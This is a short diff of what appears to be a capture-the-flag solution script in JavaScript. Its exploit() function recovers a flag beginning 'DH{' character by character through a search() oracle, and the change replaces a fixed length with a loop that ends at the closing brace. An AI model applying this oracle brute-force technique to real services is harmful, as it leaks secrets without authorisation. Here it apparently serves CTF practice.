@@ -32,11 +32,10 @@ async function search(query) {
 }
 
 async function exploit() {
-    let chars = "0123456789abcdef"
-    let secret_length = 32;
+    let chars = "0123456789abcdef}"
     let secret = "DH{";
 
-    for (let i = 0; i < secret_length; i++) {
+     while (!secret.includes("}")) {
         for (let c of chars) {
             if (await search(secret + c)) {
                 secret += c;
